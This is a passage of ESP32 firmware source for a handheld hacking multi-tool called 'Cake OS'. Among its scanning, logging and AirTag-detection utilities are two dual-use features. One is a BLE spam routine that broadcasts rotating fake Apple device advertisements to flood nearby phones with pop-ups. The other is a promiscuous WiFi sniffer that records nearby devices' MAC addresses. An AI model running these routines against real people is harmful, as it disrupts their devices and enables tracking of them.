  tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.drawString(mb, 112, 0);
  int numTeeth = MODELS[keyModel].teeth; int maxDepth = MODELS[keyModel].maxDepth;
  int totalWidth = numTeeth * 24; int offsetX = (160 - totalWidth) / 2;
  const int BASE_Y = 26, BOTTOM_Y = 48, DIGIT_Y = 14, SCALE = 2;
  for (int i = 0; i < numTeeth; i++) {
    int xL = offsetX + i * 24, xC = xL + 12, xR = xL + 24;
    int depth = keyTeeth[i]; if (depth > maxDepth) depth = maxDepth;
    int yC = BASE_Y + depth * SCALE;
    uint16_t c = (i == keySelectedTooth) ? TFT_YELLOW : TFT_CYAN;
    tft.drawLine(xL, BASE_Y, xC, yC, c); tft.drawLine(xC, yC, xR, BASE_Y, c);
  }
  tft.drawFastHLine(offsetX, BOTTOM_Y, totalWidth, TFT_WHITE);
  for (int i = 0; i < numTeeth; i++) { int xC = offsetX + i * 24 + 12; char b[4]; snprintf(b,sizeof(b),"%d",keyTeeth[i]); tft.setTextColor((i==keySelectedTooth)?TFT_YELLOW:TFT_WHITE,TFT_BLACK); tft.drawCentreString(b,xC,DIGIT_Y,1); }
}
void drawKeyModelMenu() {
  clearAll();
  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawCentreString("Select Model", 80, 4, 1);
  for (int i = 0; i < MODEL_COUNT; i++) { int y = 18 + i * 11; String line = String(MODELS[i].name) + "  " + String(MODELS[i].teeth) + "T 0-" + String(MODELS[i].maxDepth); tft.setTextColor((i==keyModelMenuSel)?TFT_YELLOW:TFT_WHITE,TFT_BLACK); tft.drawString(((i==keyModelMenuSel)?"> ":"  ")+line,4,y); }
}
void drawKeyExportedScreen() {
  clearAll();
  tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.drawCentreString("EXPORTED", 80, 6, 1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Model: " + String(MODELS[keyModel].name), 4, 22);
  int numTeeth = MODELS[keyModel].teeth; String cuts = "Cuts :";
  for (int i = 0; i < numTeeth; i++) { cuts += " "; cuts += String(keyTeeth[i]); }
  tft.drawString(cuts, 4, 36); tft.drawString("Sum  : " + String(keyExportSum), 4, 50);
}
void keyExport() { int numTeeth = MODELS[keyModel].teeth; int sum = 0; for (int i=0;i<numTeeth;i++) sum+=keyTeeth[i]; keyExportSum=sum; Serial.println("=== KEY EXPORT ==="); Serial.print("Model: "); Serial.println(MODELS[keyModel].name); Serial.print("Sum  : "); Serial.println(sum); }
void showKeyEncoder() {
  deinitWifi(); deinitBLE();
  keyState = KS_EDIT; keySelectedTooth = 0; keyNeedsRedraw = true;
  while (true) {
    if (keyNeedsRedraw) { if (keyState==KS_EDIT) drawKeyEditScreen(); else if (keyState==KS_MODEL_MENU) drawKeyModelMenu(); else if (keyState==KS_EXPORTED) drawKeyExportedScreen(); keyNeedsRedraw = false; }
    char k = getKeyEncoder(); if (k == 0) { delay(20); continue; }
    if (keyState == KS_EDIT) {
      int numTeeth = MODELS[keyModel].teeth; int maxDepth = MODELS[keyModel].maxDepth;
      if (k=='U'){if(keyTeeth[keySelectedTooth]<maxDepth){keyTeeth[keySelectedTooth]++;keySave();keyNeedsRedraw=true;}}
      else if (k=='D'){if(keyTeeth[keySelectedTooth]>0){keyTeeth[keySelectedTooth]--;keySave();keyNeedsRedraw=true;}}
      else if (k=='L'){keySelectedTooth=(keySelectedTooth+1)%numTeeth;keyNeedsRedraw=true;}
      else if (k=='X'){
        if (promptSaveLog()) {
          char buf[80];
          hackLogSection("Key Encoder");
          snprintf(buf, sizeof(buf), "Model: %s", MODELS[keyModel].name); hackLogAppend(buf);
          int numTeeth2 = MODELS[keyModel].teeth;
          String cuts = "Cuts :";
          for (int i = 0; i < numTeeth2; i++) { cuts += " "; cuts += String(keyTeeth[i]); }
          hackLogAppend(cuts.c_str());
          int sum = 0; for (int i = 0; i < numTeeth2; i++) sum += keyTeeth[i];
          snprintf(buf, sizeof(buf), "Sum  : %d", sum); hackLogAppend(buf);
          hackSaveToast();
        }
        keyNeedsRedraw = true;
      }
      else if (k=='M'){keyState=KS_MODEL_MENU;keyModelMenuSel=keyModel;keyNeedsRedraw=true;}
      else if (k=='E') break;
    } else if (keyState == KS_MODEL_MENU) {
      if (k=='U'){keyModelMenuSel=(keyModelMenuSel+MODEL_COUNT-1)%MODEL_COUNT;keyNeedsRedraw=true;}
      else if (k=='D'){keyModelMenuSel=(keyModelMenuSel+1)%MODEL_COUNT;keyNeedsRedraw=true;}
      else if (k=='L'){keyModel=keyModelMenuSel;for(int i=0;i<8;i++)keyTeeth[i]=0;keySelectedTooth=0;keySave();keyState=KS_EDIT;keyNeedsRedraw=true;}
      else if (k=='R'||k=='M'||k=='E'){keyState=KS_EDIT;keyNeedsRedraw=true;}
    } else if (keyState == KS_EXPORTED) { keyState = KS_EDIT; keyNeedsRedraw = true; }
    delay(20);
  }
}
void showDeviceTracker() {
  deinitWifi();
  clearAll(); titleBar("Device Tracker"); tft.drawString("Scanning...", 2, 20);
  WiFi.mode(WIFI_STA); WiFi.disconnect();
  esp_wifi_set_promiscuous_rx_cb(snifferCallback); esp_wifi_set_promiscuous(true);
  trackCount=0; trackRunning=true;
  int sel=0, off=0; unsigned long lastRefresh=millis();
  while (true) {
    if (millis()-lastRefresh>500) { lastRefresh=millis(); clearAll();
      char t[24]; snprintf(t,sizeof(t),"Track: %d",trackCount); titleBar(t);
      tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("R:save R2x:exit", 96, 0); tft.setTextColor(TFT_WHITE, TFT_BLACK);
      if (sel<off) off=sel; if (sel>=off+4) off=sel-3;
      for (int i=0;i<4&&off+i<trackCount;i++){int idx=off+i;char mb[20];snprintf(mb,sizeof(mb),"%02X:%02X:%02X:%02X:%02X:%02X",trackList[idx].mac[0],trackList[idx].mac[1],trackList[idx].mac[2],trackList[idx].mac[3],trackList[idx].mac[4],trackList[idx].mac[5]);String line=String(mb).substring(6)+" "+String(trackList[idx].rssi);tft.drawString(((idx==sel)?"> ":"  ")+line,2,14+i*12);}}
    char k=getKey();
    if (k=='U'){if(trackCount>0){sel--;if(sel<0)sel=trackCount-1;}}
    else if (k=='D'){if(trackCount>0){sel++;if(sel>=trackCount)sel=0;}}
    else if (k=='R') { if (promptSaveLog()) {
      char buf[80]; hackLogSection("Device Tracker");
      for (int i = 0; i < trackCount; i++) {
        snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X  %d",
          trackList[i].mac[0],trackList[i].mac[1],trackList[i].mac[2],
          trackList[i].mac[3],trackList[i].mac[4],trackList[i].mac[5],
          trackList[i].rssi);
        hackLogAppend(buf);
      }
      hackSaveToast(); } }
    else if (k=='E') break;
    delay(20);
  }
  trackRunning=false; esp_wifi_set_promiscuous(false);
  delay(150); deinitWifi(); delay(150);
}
class MyScanCallbacks : public NimBLEScanCallbacks {
  void onResult(const NimBLEAdvertisedDevice* dev) override {
    if (dev->haveName()) {
      String name = dev->getName().c_str(); int rssi = dev->getRSSI();
      String mac = dev->getAddress().toString().c_str();
      for (int i=0;i<bleDeviceCount;i++) if (name.equals(bleDevices[i].name)) { bleDevices[i].rssi=rssi; return; }
      if (bleDeviceCount < MAX_BLE_DEVICES) { strncpy(bleDevices[bleDeviceCount].name, name.c_str(), 31); bleDevices[bleDeviceCount].name[31]='\0'; bleDevices[bleDeviceCount].rssi = rssi; bleDevices[bleDeviceCount].mac[0]=0; if (mac.length()>=8) { strncpy(bleDevices[bleDeviceCount].mac, mac.substring(0,8).c_str(), 8); bleDevices[bleDeviceCount].mac[8]='\0'; } bleAddrCache[bleDeviceCount] = dev->getAddress(); bleDeviceCount++; }
    }
  }
};
void showBLEScan() {
  deinitWifi(); WiFi.disconnect(true); WiFi.mode(WIFI_OFF); delay(500);
  clearAll(); titleBar("BLE Scan+");
  tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("R2x:exit", 110, 0);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  NimBLEDevice::init("CakeOS"); bleInited=true; bleDeviceCount=0;
  NimBLEScan* pScan = NimBLEDevice::getScan();
  pScan->setScanCallbacks(new MyScanCallbacks(), false);
  pScan->setActiveScan(true); pScan->setInterval(100); pScan->setWindow(99); pScan->start(0);
  int sel=0, off=0; unsigned long lastRefresh=millis(); bool exitFlag=false;
  while (!exitFlag) {
    if (millis()-lastRefresh>500){lastRefresh=millis();clearAll();titleBar("BLE Devices");
      tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("R:save R2x:exit", 96, 0); tft.setTextColor(TFT_WHITE, TFT_BLACK);
      if (sel<off) off=sel; if (sel>=off+4) off=sel-3;
      for (int i=0;i<4&&off+i<bleDeviceCount;i++){int idx=off+i;String name=String(bleDevices[idx].name);if(name.length()==0)name="Unknown";String line=name.substring(0,8)+" "+String(bleDevices[idx].mac).substring(0,5)+" "+String(bleDevices[idx].rssi);tft.drawString(((idx==sel)?"> ":"  ")+line,2,14+i*12);}}
    char k=getKey();
    if (k=='U'){if(bleDeviceCount>0){sel--;if(sel<0)sel=bleDeviceCount-1;}}
    else if (k=='D'){if(bleDeviceCount>0){sel++;if(sel>=bleDeviceCount)sel=0;}}
    else if (k=='R') { if (promptSaveLog()) {
      char buf[80]; hackLogSection("BLE Scan");
      for (int i = 0; i < bleDeviceCount; i++) {
        snprintf(buf, sizeof(buf), "%-20s  %-10s  %d",
          bleDevices[i].name, bleDevices[i].mac, bleDevices[i].rssi);
        hackLogAppend(buf);
      }
      hackSaveToast(); } }
    else if (k=='E') exitFlag=true;
    delay(20);
  }
  if (pScan->isScanning()) pScan->stop();
  delay(150); pScan->setScanCallbacks(nullptr); delay(150); deinitBLE();
}
struct AppleDevice { const char* name; uint8_t payload[16]; };
const AppleDevice APPLE_DEVICES[] = {
  {"AirPods", {0x4C,0x00,0x07,0x19,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0A,0x0B,0x0C}},
  {"AppleTV", {0x4C,0x00,0x0F,0x05,0xC1,0x01,0x60,0x4C,0x95,0x00,0x00,0x00,0x00,0x00,0x00,0x00}},
  {"AirPlay", {0x4C,0x00,0x09,0x06,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}},
  {"Handoff", {0x4C,0x00,0x0C,0x0E,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}},
  {"Nearby",  {0x4C,0x00,0x0D,0x0E,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}},
  {"AirTag",  {0x4C,0x00,0x12,0x19,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}}
};
const int APPLE_DEVICE_COUNT = 6;
void showBLESpam() {
  deinitWifi(); WiFi.disconnect(true); WiFi.mode(WIFI_OFF); delay(500);
  clearAll(); titleBar("BLE Spam+");
  tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("R2x:exit", 110, 0);
  tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Spamming...", 2, 20);
  NimBLEDevice::init("CakeOS"); bleInited=true;
  NimBLEAdvertising* pAdv = NimBLEDevice::getAdvertising();
  NimBLEAdvertisementData advData;
  advData.setName(APPLE_DEVICES[0].name); advData.setManufacturerData(std::string((const char*)APPLE_DEVICES[0].payload, 16));
  pAdv->setAdvertisementData(advData); pAdv->setMinInterval(0x20); pAdv->setMaxInterval(0x30); pAdv->start();
  int cnt=0, devIdx=0; unsigned long lastChange=millis(); bool exitFlag=false;
  while (!exitFlag) {
    if (millis()-lastChange>200) { lastChange=millis(); cnt++; devIdx=(devIdx+1)%APPLE_DEVICE_COUNT; const AppleDevice& dev = APPLE_DEVICES[devIdx];
      NimBLEAdvertisementData newAdv; newAdv.setName(dev.name); newAdv.setManufacturerData(std::string((const char*)dev.payload, 16));
      pAdv->setAdvertisementData(newAdv); pAdv->stop(); delay(2); pAdv->start();
      tft.fillRect(0,40,160,30,TFT_BLACK); tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.drawString("Cnt:"+String(cnt), 2, 40); tft.drawString(dev.name, 2, 52); }
    char k=getKey(); if (k=='R'||k=='E') exitFlag=true;
    delay(10);
  }
  if (pAdv) pAdv->stop();
  delay(200); deinitBLE();
}
void showChanGraph() {
  deinitWifi(); tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Channel Graph", 2, 0);
  tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("R2x:exit", 110, 0);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  unsigned long lastScan=0; bool scanning=false;
  while (true) {
    char k=getKey(); if (k=='R'||k=='E') break;
    if (!scanning && millis()-lastScan>5000) { lastScan=millis(); WiFi.mode(WIFI_STA); WiFi.scanNetworks(true); scanning=true; }
    if (scanning) { int n = WiFi.scanComplete();
      if (n>=0) { scanning=false; int chCount[14]={0}; for (int i=0;i<n;i++){int ch=WiFi.channel(i);if(ch>=1&&ch<=13)chCount[ch]++;}
        int maxC=1; for (int c=1;c<=13;c++) if (chCount[c]>maxC) maxC=chCount[c];
        tft.fillRect(0,12,160,68,TFT_BLACK);
        char info[24]; snprintf(info,sizeof(info),"APs:%d  Max:%d",n,maxC);
        tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString(info, 2, 12);
        int baseY=68, topY=22, maxH=baseY-topY, barW=9, gap=2, startX=4;
        for (int c=1;c<=13;c++){ int x=startX+(c-1)*(barW+gap); int h=(chCount[c]*maxH)/maxC; if(h<1)h=1;
          uint16_t col=(c==1||c==6||c==11)?TFT_GREEN:TFT_BLUE;
          tft.fillRect(x,baseY-h,barW,h,col); tft.drawRect(x,baseY-h,barW,h,TFT_WHITE);
          char buf[4]; snprintf(buf,sizeof(buf),"%d",c); tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawCentreString(buf,x+barW/2,baseY+2,1); }
        WiFi.scanDelete(); } }
    delay(20);
  }
  delay(150); if (wifiConfigured) restartWifi(); delay(150);
}
void showBleGatt() {
  deinitWifi(); WiFi.disconnect(true); WiFi.mode(WIFI_OFF); delay(500); deinitBLE(); delay(200);
  clearAll(); tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("BLE GATT", 2, 0);
  tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("R2x:exit", 110, 0);
  tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Scanning 5s...", 2, 20);
  NimBLEDevice::init("CakeOS"); bleInited=true; bleDeviceCount=0;
  NimBLEScan* pScan = NimBLEDevice::getScan();
  MyScanCallbacks* cb = new MyScanCallbacks();
  pScan->setScanCallbacks(cb, false); pScan->setActiveScan(true); pScan->setInterval(100); pScan->setWindow(99); pScan->start(0);
  unsigned long sStart=millis(); bool cancelled=false;
  while (millis()-sStart<5000) { delay(100); char k=getKey(); if (k=='R'||k=='E') { cancelled=true; break; } }
  if (pScan->isScanning()) pScan->stop(); delay(150); pScan->setScanCallbacks(nullptr); delay(150);
  if (cancelled || bleDeviceCount==0) { if (!cancelled && bleDeviceCount==0) { clearAll(); tft.setTextColor(TFT_RED, TFT_BLACK); tft.drawCentreString("No BLE devices", 80, 30, 1); delay(800); } NimBLEDevice::deinit(false); bleInited=false; delay(100); return; }
  int sel=0, off=0;
  while (true) {
    clearAll(); tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Select BLE", 2, 0);
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("R2x:back", 110, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    if (sel<off) off=sel; if (sel>=off+4) off=sel-3;
    for (int i=0;i<4&&off+i<bleDeviceCount;i++){int idx=off+i;String name=String(bleDevices[idx].name);if(name.length()==0)name="Unknown";String line=name.substring(0,12)+" "+String(bleDevices[idx].rssi);tft.drawString(((idx==sel)?"> ":"  ")+line,2,14+i*12);}
    char k=getKey();
    if (k=='U'){sel--;if(sel<0)sel=bleDeviceCount-1;}
    else if (k=='D'){sel++;if(sel>=bleDeviceCount)sel=0;}
    else if (k=='L') break;
    else if (k=='R'||k=='E'){NimBLEDevice::deinit(false);bleInited=false;delay(100);return;}
    delay(20);
  }
  clearAll(); tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Connecting...", 2, 0);
  NimBLEClient* pClient = NimBLEDevice::createClient();
  if (!pClient){NimBLEDevice::deinit(false);bleInited=false;delay(100);return;}
  NimBLEAddress addr = bleAddrCache[sel]; bool connected=false; unsigned long cStart=millis();
  while (millis()-cStart<5000){if(pClient->connect(addr,false)){connected=true;break;}delay(200);}
  if (!connected){clearAll();tft.setTextColor(TFT_RED,TFT_BLACK);tft.drawCentreString("Connect failed",80,30,1);delay(800);NimBLEDevice::deleteClient(pClient);delay(100);NimBLEDevice::deinit(false);bleInited=false;delay(100);return;}
  std::vector<NimBLERemoteService*> services = pClient->getServices(true); int svcCount = services.size();
  if (svcCount==0){clearAll();tft.setTextColor(TFT_RED,TFT_BLACK);tft.drawCentreString("No services",80,30,1);delay(800);services.clear();delay(50);if(pClient->isConnected())pClient->disconnect();delay(150);NimBLEDevice::deleteClient(pClient);delay(150);NimBLEDevice::deinit(false);bleInited=false;delay(100);return;}
  int svcSel=0, svcOff=0;
  while (true) {
    clearAll(); tft.setTextColor(TFT_CYAN, TFT_BLACK);
    char hdr[24]; snprintf(hdr,sizeof(hdr),"SVC %d/%d",svcSel+1,svcCount); tft.drawString(hdr,2,0);
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("R:save R2x:exit", 96, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    if (svcSel<svcOff) svcOff=svcSel; if (svcSel>=svcOff+5) svcOff=svcSel-4;
    auto it = services.begin(); for (int i=0;i<svcOff && it!=services.end();i++) it++;
    for (int i=0;i<5 && it!=services.end();i++){NimBLERemoteService* svc=*it;String uuid=svc->getUUID().toString().c_str();if(uuid.length()>18)uuid=uuid.substring(0,18);tft.drawString(((svcSel==svcOff+i)?"> ":"  ")+uuid,2,14+i*11);it++;}
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("U/D:scroll  R:save", 2, 74);
    char k=getKey();
    if (k=='U'){svcSel--;if(svcSel<0)svcSel=svcCount-1;}
    else if (k=='D'){svcSel++;if(svcSel>=svcCount)svcSel=0;}
    else if (k=='R') { if (promptSaveLog()) {
      hackLogSection("BLE GATT Services");
      char buf[64]; snprintf(buf, sizeof(buf), "Device: %s", bleDevices[sel].name); hackLogAppend(buf);
      for (auto* svc : services) { String uuid = svc->getUUID().toString().c_str(); snprintf(buf, sizeof(buf), "SVC: %s", uuid.c_str()); hackLogAppend(buf); }
      hackSaveToast(); } }
    else if (k=='E') break;
    delay(20);
  }
  services.clear(); delay(100);
  if (pClient->isConnected()){pClient->disconnect();delay(200);}
  NimBLEDevice::deleteClient(pClient); delay(200); NimBLEDevice::deinit(false); bleInited=false; delay(100);
}
#define MAX_TRACKERS 10
struct TrackerHit { char mac[18]; int rssi; unsigned long lastSeen; };
TrackerHit trackerList[MAX_TRACKERS];
int trackerCount = 0;
volatile bool trackerRunning = false;
class TrackerScanCallbacks : public NimBLEScanCallbacks {
  void onResult(const NimBLEAdvertisedDevice* dev) override {
    if (!trackerRunning) return;
    if (dev->haveManufacturerData()) {
      std::string mfg = dev->getManufacturerData();
      if (mfg.length()>=4 && (uint8_t)mfg[0]==0x4C && (uint8_t)mfg[1]==0x00 && (uint8_t)mfg[2]==0x12 && (uint8_t)mfg[3]==0x19) {
        String mac = dev->getAddress().toString().c_str(); int rssi = dev->getRSSI();
        for (int i=0;i<trackerCount;i++) if (mac.equals(trackerList[i].mac)) { trackerList[i].rssi=rssi; trackerList[i].lastSeen=millis(); return; }
        if (trackerCount<MAX_TRACKERS){strncpy(trackerList[trackerCount].mac,mac.c_str(),17);trackerList[trackerCount].mac[17]='\0';trackerList[trackerCount].rssi=rssi;trackerList[trackerCount].lastSeen=millis();trackerCount++;}
      }
    }
  }
};
void showTrackerDetect() {
  deinitWifi(); WiFi.disconnect(true); WiFi.mode(WIFI_OFF); delay(500); deinitBLE(); delay(200);
  clearAll(); tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Tracker Detect", 2, 0);
  tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("R2x:exit", 110, 0);
  tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Scanning...", 2, 20);
  NimBLEDevice::init("CakeOS"); bleInited=true; trackerCount=0; trackerRunning=true;
  NimBLEScan* pScan = NimBLEDevice::getScan();
  pScan->setScanCallbacks(new TrackerScanCallbacks(), false);
  pScan->setActiveScan(true); pScan->setInterval(100); pScan->setWindow(99); pScan->start(0);
  int sel=0, off=0; unsigned long lastRefresh=millis(); bool exitFlag=false;
  while (!exitFlag) {
    if (millis()-lastRefresh>500) { lastRefresh=millis(); clearAll();
      char hdr[24]; snprintf(hdr,sizeof(hdr),"Trackers: %d",trackerCount);
      tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString(hdr,2,0);
      tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("R:save R2x:exit", 96, 0);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      if (sel<off) off=sel; if (sel>=off+4) off=sel-3;
      for (int i=0;i<4&&off+i<trackerCount;i++){int idx=off+i;String mac=String(trackerList[idx].mac).substring(9);String line=mac+" "+String(trackerList[idx].rssi);tft.drawString(((idx==sel)?"> ":"  ")+line,2,14+i*12);}
      if (trackerCount==0){tft.setTextColor(TFT_DARKGREY,TFT_BLACK);tft.drawString("No tracker found",2,30);} }
    char k=getKey();
    if (k=='U'){if(trackerCount>0){sel--;if(sel<0)sel=trackerCount-1;}}
    else if (k=='D'){if(trackerCount>0){sel++;if(sel>=trackerCount)sel=0;}}
    else if (k=='R') { if (promptSaveLog()) {
      char buf[64]; hackLogSection("Tracker Detect");
      for (int i = 0; i < trackerCount; i++) { snprintf(buf, sizeof(buf), "%s  %d", trackerList[i].mac, trackerList[i].rssi); hackLogAppend(buf); }
      hackSaveToast(); } }
    else if (k=='E') exitFlag=true;
    delay(20);
  }
  trackerRunning=false; delay(100);
  if (pScan->isScanning()) pScan->stop(); delay(150); pScan->setScanCallbacks(nullptr); delay(150); deinitBLE();
}

// ==================================================
// ============== Memory / Log / About ==============
// ==================================================
#define LOG_FILE "/log.txt"
void logOverwrite(const char* title) { ensureLittleFS(); File f = LittleFS.open(LOG_FILE, "w"); if (f) { f.println("=== Cake OS Log ==="); f.print("Title: "); f.println(title); f.print("Time:  "); f.print(millis()/1000); f.println("s"); f.println("---"); f.close(); } }
void logAppend(const char* line) { ensureLittleFS(); File f = LittleFS.open(LOG_FILE, "a"); if (f) { f.println(line); f.close(); } }
void logClear() { ensureLittleFS(); LittleFS.remove(LOG_FILE); clearAll(); titleBar("Log Cleared"); delay(800); }
void showMemory() {
  while (true) {
    clearAll();
    tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Memory", 2, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawString("Free : " + String(ESP.getFreeHeap()/1024) + " K", 2, 16);
    tft.drawString("Min  : " + String(ESP.getMinFreeHeap()/1024) + " K", 2, 28);
    tft.drawString("Size : " + String(ESP.getHeapSize()/1024) + " K", 2, 40);
    tft.drawString("Sketch:" + String(ESP.getSketchSize()/1024) + " K", 2, 52);
    tft.drawString("Flash : " + String(ESP.getFlashChipSize()/1024/1024) + " MB", 2, 64);
    delay(500); char k = getKey(); if (k == 'R' || k == 'E') break;
  }
}
void showLogView() {
  ensureLittleFS(); File f = LittleFS.open(LOG_FILE, "r");
  if (!f) { clearAll(); titleBar("No Log"); waitExit(); return; }
  const int MAX_LINES = 80; static String lines[MAX_LINES]; int lineCount = 0;
  while (f.available() && lineCount < MAX_LINES) lines[lineCount++] = f.readStringUntil('\n');
  f.close();
  if (lineCount == 0) { clearAll(); titleBar("Empty Log"); waitExit(); return; }
  int scroll = 0; const int VISIBLE = 6;
  while (true) {
    clearAll(); tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Log View", 2, 0);
    char pos[16]; snprintf(pos, sizeof(pos), "%d/%d", scroll+1, lineCount); tft.drawString(pos, 130, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    for (int i = 0; i < VISIBLE && scroll+i < lineCount; i++) tft.drawString(lines[scroll+i].substring(0,26), 2, 12+i*10);
    char k = getKey();
    if (k == 'U') scroll = (scroll > 0) ? scroll - 1 : 0;
    else if (k == 'D') scroll = (scroll < lineCount-1) ? scroll + 1 : lineCount - 1;
    else if (k == 'R' || k == 'E') break;
    delay(30);
  }
}
void showLogExport() {
  clearAll(); titleBar("Log Export");
  tft.drawString("Open Serial Monitor", 2, 20); tft.drawString("Baud 115200", 2, 34); tft.drawString("Sending in 3s...", 2, 50);
  delay(3000);
  ensureLittleFS();
  File f = LittleFS.open(LOG_FILE, "r");
  Serial.println("=== CAKE OS LOG START ===");
  if (f) { while (f.available()) { String line = f.readStringUntil('\n'); Serial.println(line); delay(2); } f.close(); }
  File hf = LittleFS.open(HACKLOG_FILE, "r");
  if (hf) { Serial.println("=== HACK LOG START ==="); while (hf.available()) { String line = hf.readStringUntil('\n'); Serial.println(line); delay(2); } hf.close(); }
  Serial.println("=== CAKE OS LOG END ===");
  clearAll(); tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.drawCentreString("Export Done", 80, 20, 1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Check serial port", 2, 44);
  waitExit();
}
void showHackLogView() {
  ensureLittleFS(); File f = LittleFS.open(HACKLOG_FILE, "r");
  if (!f) { clearAll(); titleBar("No Hack Log"); waitExit(); return; }
  const int MAX_LINES = 80; static String lines[MAX_LINES]; int lineCount = 0;
  while (f.available() && lineCount < MAX_LINES) lines[lineCount++] = f.readStringUntil('\n');
  f.close();
  if (lineCount == 0) { clearAll(); titleBar("Empty Hack Log"); waitExit(); return; }
  int scroll = 0; const int VISIBLE = 6;
  while (true) {
    clearAll(); tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Hack Log", 2, 0);
    char pos[16]; snprintf(pos, sizeof(pos), "%d/%d", scroll+1, lineCount); tft.drawString(pos, 130, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    for (int i = 0; i < VISIBLE && scroll+i < lineCount; i++) tft.drawString(lines[scroll+i].substring(0,26), 2, 12+i*10);
    char k = getKey();
    if (k == 'U') scroll = (scroll > 0) ? scroll - 1 : 0;
    else if (k == 'D') scroll = (scroll < lineCount-1) ? scroll + 1 : lineCount - 1;
    else if (k == 'R' || k == 'E') break;
    delay(30);
  }
}
void showLog() {
  int sel = 0; const char* items[] = {"View","Hack Log","Export","Clear","Clear Hack"}; const int ITEM_COUNT = 5;
  while (true) {
    clearAll(); ensureLittleFS();
    File f = LittleFS.open(LOG_FILE, "r"); int size = f ? f.size() : 0; if (f) f.close();
    size_t hsize = hackLogSize();
    tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Log", 2, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    char buf[24]; snprintf(buf, sizeof(buf), "%dB/%uB", size, (unsigned)hsize);
    tft.drawString(buf, 100, 0);
    for (int i = 0; i < ITEM_COUNT; i++) { String pre = (i==sel)?" >":" "; tft.setTextColor(i==sel?TFT_YELLOW:TFT_WHITE, TFT_BLACK); tft.drawString(pre+String(items[i]), 2, 20+i*12); }
    char k = getKey();
    if (k == 'U') sel = (sel + ITEM_COUNT - 1) % ITEM_COUNT;
    else if (k == 'D') sel = (sel + 1) % ITEM_COUNT;
    else if (k == 'L') {
      if (sel==0) showLogView();
      else if (sel==1) showHackLogView();
      else if (sel==2) showLogExport();
      else if (sel==3) logClear();
      else if (sel==4) { hackLogClear(); clearAll(); titleBar("Hack Log Cleared"); delay(800); }
    }
    else if (k == 'R' || k == 'E') break;
    delay(30);
  }
}
void showAbout() {
  clearAll(); titleBar("About");
  tft.drawString(DEVICE_NAME, 2, 20);
  tft.drawString("Ver: " + String(VERSION), 2, 34);
  tft.drawString("Author: MCXP", 2, 48);
  tft.drawString("Heap: " + String(ESP.getFreeHeap()), 2, 62);
  waitExit();
}

// ==================== 第 1/2 批结束 ====================
// ==================== Cake OS 5.3 - Part 2/2 ====================

// ==================================================
// ============== Terminal ==============
// ==================================================
#define TERM_HIST_MAX  32
#define TERM_ALLOUT    160
#define TERM_LINE_W    26
#define TERM_BUF_MAX   80
#define TERM_LINES     3
#define TERM_VIEW      8
#define TERM_OUTBUF    64
char tHist[TERM_HIST_MAX][TERM_LINE_W + 1]; int tHistCount = 0;
char tAllOut[TERM_ALLOUT][TERM_LINE_W + 1]; int tAllOutCount = 0;
char tInput[TERM_BUF_MAX + 1]; int tInputLen = 0;
char tOutBuf[TERM_OUTBUF][TERM_LINE_W + 1]; int tOutCount = 0;
char tCmdHist[8][TERM_BUF_MAX + 1]; int tCmdHistCount = 0;
void tPushLine(const char* line) {
  if (tHistCount < TERM_HIST_MAX) { strncpy(tHist[tHistCount], line, TERM_LINE_W); tHist[tHistCount][TERM_LINE_W]=0; tHistCount++; }
  else { for (int i=0;i<TERM_HIST_MAX-1;i++) memcpy(tHist[i],tHist[i+1],TERM_LINE_W+1); strncpy(tHist[TERM_HIST_MAX-1],line,TERM_LINE_W); tHist[TERM_HIST_MAX-1][TERM_LINE_W]=0; }
